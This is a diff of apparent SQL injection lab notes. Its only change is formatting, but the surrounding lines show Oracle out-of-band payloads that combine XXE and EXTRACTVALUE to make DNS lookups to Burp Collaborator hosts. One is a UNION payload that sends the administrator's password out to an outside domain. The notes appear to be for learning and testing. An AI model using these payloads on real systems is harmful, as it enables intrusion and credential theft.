@@ -487,8 +487,7 @@ mysqli_real_escape_string($conn, $_POST['username']); $password = mysqli_real_es
 > > SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://sqmxgqkqk0lopbi04l88x96v2m8dw4kt.oastify.com/"> %remote;]>'),'/l') FROM dual
 > > ```
 > >
-> > DNS Lookup:\
-> >
+> > DNS Lookup:<br>
 > >
 > > ```
 > > SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://wcc9qdxnn2kmj8qlqoe2s0vic9i06quf.oastify.com/"> %remote;]>'),'/l') FROM dual
@@ -511,16 +510,14 @@ mysqli_real_escape_string($conn, $_POST['username']); $password = mysqli_real_es
 > >
 > > \
 > > \
-> > Query for username and password:\
-> >
+> > Query for username and password:<br>
 > >
 > > ```
 > > SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
 > > ```
 > >
 > > \
-> > Payload:\
-> >
+> > Payload:<br>
 > >
 > > ```
 > > ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mxnzb3id8s5c4ybbbezsdqg8xz3qrhf6.oastify.com/"> %remote;]>'),'/l') FROM dual--
@@ -528,5 +525,4 @@ mysqli_real_escape_string($conn, $_POST['username']); $password = mysqli_real_es
 > >
 > > \
 > > \
-> > \
-> >
+> > <br>
